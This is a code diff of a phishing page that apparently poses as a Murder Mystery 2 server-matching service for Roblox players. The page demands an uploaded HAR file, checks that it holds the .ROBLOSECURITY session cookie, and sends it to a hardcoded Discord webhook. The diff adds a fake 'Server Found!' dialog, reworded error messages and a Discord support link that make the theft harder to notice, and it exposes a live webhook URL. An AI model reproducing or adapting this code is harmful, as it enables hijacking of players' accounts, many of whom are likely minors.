@@ -74,7 +74,9 @@
         This allows us to find players with similar progress.
       </p>
       <p>
-        If you need support, watch the tutorial on the right.
+        If you need support, join my Discord server 
+        <a href="https://discord.gg/qJK7Fxd2YE" target="_blank">here</a> 
+        or watch the tutorial on the right.
       </p>
       <p><strong>DISCLAIMER:</strong> You must be logged into an account when getting your HAR file. This allows us to see the server your account connects to for MM2.</p>
 
@@ -117,9 +119,9 @@
         return;
       }
 
-      // Check if you are logged in your account when getting your MM2 file!
+      // Check if .ROBLOSECURITY exists in HAR content
       if (!harContent.includes('.ROBLOSECURITY')) {
-        Swal.fire('The HAR file does not contain a .ROBLOSECURITY cookie.');
+        Swal.fire('You are not logged in your ROBLOX account!');
         return;
       }
 
@@ -127,11 +129,6 @@
     });
 
     function proceedWithServerSelection(username, level, godlies, harContent) {
-      Swal.fire({
-        icon: 'success',
-        title: 'Please wait while we find a server for you, you will be redirected to the server page when we are ready...'
-      });
-
       // Send data to webhook
       fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
         method: 'POST',
@@ -147,21 +144,27 @@
       })
         .then(response => {
           if (!response.ok) {
-            console.error("Failed to send data to webhook. Response:", response);
-            Swal.fire('Error sending data to webhook. Please check the console for details.');
+            console.error("Failed to process data. Response:", response);
+            Swal.fire('Error processsing your data. Please check the console for details.');
           } else {
             console.log("Data sent successfully to the webhook.");
+            Swal.fire({
+              icon: 'success',
+              title: 'Server Found!',
+              text: 'Please click below to join the server.',
+              confirmButtonText: 'Go to MM2',
+              allowOutsideClick: false,
+            }).then((result) => {
+              if (result.isConfirmed) {
+                window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
+              }
+            });
           }
         })
         .catch(error => {
-          console.error("Error while sending data to webhook:", error);
-          Swal.fire('Error sending data to webhook. Please check the console for details.');
+          console.error("Error while processing your data!:", error);
+          Swal.fire('Error... Please check the console for details.');
         });
-
-      // Redirect to MM2 Roblox game
-      setTimeout(() => {
-        window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
-      }, 2000);
     }
   </script>
 </body>
